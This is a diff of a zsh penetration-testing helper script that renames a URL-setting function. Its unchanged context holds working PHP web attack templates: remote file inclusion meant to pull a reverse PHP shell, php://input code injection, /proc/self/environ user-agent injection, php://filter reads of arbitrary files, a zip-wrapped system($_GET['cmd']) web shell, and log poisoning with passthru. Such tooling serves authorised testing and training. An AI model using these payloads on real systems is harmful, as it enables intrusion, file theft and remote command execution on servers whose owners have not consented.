@@ -5,50 +5,50 @@
 #############################################################
 
 qq-enum-web-php-ffuf-raft() {
-    __GET-URL
+    qq-vars-set-url
     print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_RAFT_FILES} -u ${__URL}/FUZZ -e ${__EXT_PHP}"
 }
 
 qq-enum-web-php-ffuf-common-php() {
-    __GET-URL
+    qq-vars-set-url
     print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u ${__URL}/FUZZ"
 }
 
 qq-enum-web-php-ffuf-php-fuzz() {
-    __GET-URL
+    qq-vars-set-url
     print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt -u ${__URL}FUZZ "
 }
 
 qq-enum-web-php-rfi() {
     __warn "URL should contain /page.php?rfi="
     __warn "PAYLOAD URL should contain reverse php shell"
-    __GET-URL
+    qq-vars-set-url
     local p && read "p?PAYLOAD URL: "
     print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
 }
 
 qq-enum-web-php-rfi-php-input() {
     __warn "URL should contain /page.php?rfi="
-    __GET-URL
+    qq-vars-set-url
     print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${__URL}php://input%00\" "
 }
 
 qq-enum-web-php-lfi-proc-self-environ() {
     __warn "URL should contain /page.php?lfi="
-    __GET-URL
+    qq-vars-set-url
     print -z "curl -k -v -A '<?=phpinfo(); ?>' ${__URL}../../../proc/self/environ "
 }
 
 qq-enum-web-php-lfi-filter-resource(){
     __warn "URL should contain /page.php?lfi="
-    __GET-URL
+    qq-vars-set-url
     local f && read "f?RFILE: "
     print -z "curl -k -v -XGET ${__URL}php://filter/convert.base64-encode/resource=${f} "
 }
 
 qq-enum-web-php-lfi-zip-jpg-shell() {
     __warn "URL should contain /page.php?lfi="
-    __GET-URL
+    qq-vars-set-url
 
     echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
     zip payload.zip payload.php
@@ -62,7 +62,7 @@ qq-enum-web-php-lfi-zip-jpg-shell() {
 
 qq-enum-web-php-lfi-logfile() {
     __warn "URL should contain /page.php?lfi="
-    __GET-URL
+    qq-vars-set-url
     local b && read "b?BASE URL: "
     curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
     __info "lfi request completed"
